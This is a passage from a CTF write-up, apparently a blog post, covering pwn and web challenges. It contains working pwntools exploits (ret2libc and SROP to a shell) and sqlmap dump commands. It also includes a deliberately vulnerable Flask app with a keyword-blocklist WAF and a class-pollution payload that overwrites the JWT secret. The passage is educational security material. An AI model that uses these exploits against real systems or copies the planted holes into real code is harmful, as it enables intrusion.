class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">os.environ.setdefault(<span class="string">&quot;PWNLIB_CACHE_DIR&quot;</span>, <span class="string">&quot;./.pwncache&quot;</span>)</span><br><span class="line">os.makedirs(<span class="string">&quot;./.pwncache&quot;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">context.cache_dir = <span class="string">&quot;./.pwncache&quot;</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">HOST, PORT = <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">58982</span></span><br><span class="line"></span><br><span class="line">POP_RDI_RET = <span class="number">0x400713</span></span><br><span class="line">RET = <span class="number">0x4004c9</span></span><br><span class="line">PUTS_PLT = context.binary.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">PUTS_GOT = context.binary.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">MAIN = context.binary.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">OFFSET = <span class="number">0x18</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>(<span class="params">p</span>):</span><br><span class="line">    payload = flat(</span><br><span class="line">        <span class="string">b&quot;A&quot;</span> * OFFSET,</span><br><span class="line">        POP_RDI_RET,</span><br><span class="line">        PUTS_GOT,</span><br><span class="line">        PUTS_PLT,</span><br><span class="line">        MAIN,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;No backdoors this time!\n&quot;</span>, payload)</span><br><span class="line">    leak_line = p.recvline().rstrip(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    leak_line += <span class="string">b&quot;\x00&quot;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(leak_line))</span><br><span class="line">    leak_addr = u64(leak_line)</span><br><span class="line">    libc_base = leak_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Leaked puts@GLIBC: <span class="subst">&#123;<span class="built_in">hex</span>(leak_addr)&#125;</span>&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;Computed libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    p = start()</span><br><span class="line"></span><br><span class="line">    libc_base = leak_libc(p)</span><br><span class="line"></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">f&quot;system @ <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;&#x27;/bin/sh&#x27; @ <span class="subst">&#123;<span class="built_in">hex</span>(bin_sh)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat(</span><br><span class="line">        <span class="string">b&quot;A&quot;</span> * OFFSET,</span><br><span class="line">        RET,</span><br><span class="line">        POP_RDI_RET,</span><br><span class="line">        bin_sh,</span><br><span class="line">        system,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;No backdoors this time!\n&quot;</span>, payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011140719018.png" alt="image-20251011140719018"></p><h3 id="Easy-syscall"><a href="#Easy-syscall" class="headerlink" title="Easy-syscall"></a>Easy-syscall</h3><p>打SROP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./pwn&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = constants.SYS_execve</span><br><span class="line">    frame.rdi = <span class="built_in">next</span>(elf.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">    frame.rsi = <span class="number">0</span></span><br><span class="line">    frame.rdx = <span class="number">0</span></span><br><span class="line">    frame.rsp = elf.bss() + <span class="number">0x800</span></span><br><span class="line">    frame.rip = elf.sym[<span class="string">&quot;magic&quot;</span>] + <span class="number">0xF</span> </span><br><span class="line"></span><br><span class="line">    frame_bytes = <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(</span><br><span class="line">        [</span><br><span class="line">            <span class="string">b&quot;A&quot;</span> * <span class="number">48</span>,</span><br><span class="line">            frame_bytes[:<span class="number">8</span>],           </span><br><span class="line">            p64(elf.sym[<span class="string">&quot;magic&quot;</span>]),</span><br><span class="line">            frame_bytes[<span class="number">8</span>:],</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path, stdin=PIPE, stdout=PIPE)</span><br><span class="line">    host = args.HOST <span class="keyword">or</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="built_in">int</span>(args.PORT <span class="keyword">or</span> <span class="number">57192</span>)</span><br><span class="line">    <span class="keyword">return</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    io = connect()</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;hidden here...\n&quot;</span>)</span><br><span class="line">    io.send(build_payload())</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011141020356.png" alt="image-20251011141020356"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EZ-SQL"><a href="#EZ-SQL" class="headerlink" title="EZ_SQL"></a>EZ_SQL</h3><p>sqlmap一把梭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:61945/&quot; --data=&quot;id=2&quot; -p id --batch --random-agent --threads=5 --level=3 --risk=2 --dbs --banner --current-user</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:61945/&quot; --data=&quot;id=2&quot; -p id -D welcome --tables --batch --union-cols=3</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:61945/&quot; --data=&quot;id=2&quot; -p id -D welcome -T flag --columns --batch --union-cols=3</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:61945/&quot; --data=&quot;id=2&quot; -p id -D welcome -T flag --dump --batch --union-cols=3</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011141705666.png" alt="image-20251011141705666"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011141757578.png" alt="image-20251011141757578"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011141935919.png" alt="image-20251011141935919"></p><h3 id="EZ-Login（签到"><a href="#EZ-Login（签到" class="headerlink" title="EZ_Login（签到)"></a>EZ_Login（签到)</h3><p>密码是simple 弱密码爆破</p><p>本地管理员要求xff 127.0.0.1</p><p>进去后解码 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJmbGFnIjoiVFNDVEYtSnt3MzFjMG0zXzcwXzdoM193MzhfajB1cm4zeX0ifQ.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSCTF-J&#123;w31c0m3_70_7h3_w38_j0urn3y&#125;</span><br></pre></td></tr></table></figure><h3 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h3><p>访问127.0.0.1:druid&#x2F;v2&#x2F;sql</p><p>密码也是admin</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011144836197.png" alt="image-20251011144836197"></p><h3 id="EZ-PY"><a href="#EZ-PY" class="headerlink" title="EZ_PY"></a>EZ_PY</h3><p>提示source</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:58379/source</span><br></pre></td></tr></table></figure><p>拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template_string</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">24</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户数据库</span></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&quot;c1432&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_response</span>(<span class="params">message: <span class="built_in">str</span>, code: <span class="built_in">int</span> = <span class="number">200</span>, data=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Unified response format&quot;&quot;&quot;</span></span><br><span class="line">    resp = &#123;<span class="string">&#x27;message&#x27;</span>: message&#125;</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        resp[<span class="string">&#x27;data&#x27;</span>] = data</span><br><span class="line">    <span class="keyword">return</span> jsonify(resp), code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf_filter</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> input_str:</span><br><span class="line">        <span class="keyword">return</span> input_str</span><br><span class="line">    input_str = <span class="built_in">str</span>(input_str)</span><br><span class="line">    dangerous_strings = [</span><br><span class="line">        <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;bases&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;write&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;get_flashed_messages&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#123;%&#x27;</span>, <span class="string">&#x27;%&#125;&#x27;</span>, <span class="string">&#x27;&#123;#&#x27;</span>, <span class="string">&#x27;#&#125;&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> string <span class="keyword">in</span> dangerous_strings:</span><br><span class="line">        <span class="keyword">if</span> string <span class="keyword">in</span> input_str:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WAF blocked: Dangerous pattern detected&quot;</span></span><br><span class="line"></span><br><span class="line">    filtered = input_str.replace(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    filtered = filtered.replace(<span class="string">&#x27;javascript:&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    filtered = filtered.replace(<span class="string">&#x27;onload=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    filtered = filtered.replace(<span class="string">&#x27;onerror=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hello&quot;</span> <span class="keyword">in</span> filtered:</span><br><span class="line">        filtered = filtered.replace(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hacker&quot;</span> <span class="keyword">in</span> filtered:</span><br><span class="line">        filtered = filtered.replace(<span class="string">&quot;hacker&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> filtered</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, role=<span class="string">&#x27;user&#x27;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.role = role</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token_required</span>(<span class="params">f</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">f</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.headers.get(<span class="string">&#x27;Authorization&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&#x27;Authorization token is required.&#x27;</span>, <span class="number">401</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = token.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>]  <span class="comment"># 提取令牌，假设格式为 &#x27;Bearer &lt;token&gt;&#x27;</span></span><br><span class="line">            data = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">            current_user = data[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">            role = data[<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">f&#x27;Invalid token: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>, <span class="number">401</span>)</span><br><span class="line">        <span class="keyword">return</span> f(current_user, role, *args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    user = User()</span><br><span class="line">    merge(data, user)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user.username <span class="keyword">or</span> <span class="keyword">not</span> user.password:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    users[user.username] = user.password</span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&#x27;Registration successful.&#x27;</span>, <span class="number">201</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    auth = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> auth:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    username = auth.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = auth.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    <span class="keyword">if</span> users.get(username) != password:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Invalid username or password.&#x27;</span>, <span class="number">401</span>)</span><br><span class="line">    token = jwt.encode(</span><br><span class="line">        &#123;<span class="string">&#x27;user&#x27;</span>: username, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;,</span><br><span class="line">        app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>],</span><br><span class="line">        algorithm=<span class="string">&quot;HS256&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/protected&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@token_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">protected</span>(<span class="params">current_user, role</span>):</span><br><span class="line">    <span class="keyword">if</span> role != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(</span><br><span class="line">            <span class="string">f&#x27;Access denied: User <span class="subst">&#123;current_user&#125;</span> (<span class="subst">&#123;role&#125;</span>) does not have sufficient privileges.&#x27;</span>,</span><br><span class="line">            <span class="number">403</span></span><br><span class="line">        )</span><br><span class="line">    filtered_user = waf_filter(current_user)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(</span><br><span class="line">        <span class="string">f&quot;Hello, <span class="subst">&#123;filtered_user&#125;</span>! You have access to this protected resource.&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;source/index.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_page</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;source/register.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/success&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">success_page</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;source/success.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_source</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>merge 在 register 请求体上递归地对 User 对象和其类做任意属性赋值，可以一路改写 User.<em>init</em>_.<strong>globals</strong>[‘app’].config[‘SECRET_KEY’]，从而把随机密钥换成指定的值；之后就能自己签发 JWT。</p><p>waf_filter 只做字符串替换，hello→，其黑名单又可以用字符串拼接和 %c 生成函数绕过，因此可以把用户名字段变成任意 Jinja 表达式并触发 SSTI</p><p>先把密钥改成已知值如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">            &quot;username&quot;: &quot;attacker&quot;,</span><br><span class="line">            &quot;password&quot;: &quot;pass&quot;,</span><br><span class="line">            &quot;__class__&quot;: &#123;</span><br><span class="line">              &quot;__init__&quot;: &#123;</span><br><span class="line">                &quot;__globals__&quot;: &#123;</span><br><span class="line">                  &quot;app&quot;: &#123;</span><br><span class="line">                    &quot;config&quot;: &#123;</span><br><span class="line">                      &quot;SECRET_KEY&quot;: &quot;mysecret&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">新密钥签一个 role 为 admin 的 JWT，并把 user 字段写成绕过 WAF 的模板表达式。示例载荷会把 __globals__、__builtins__、open、read、flag 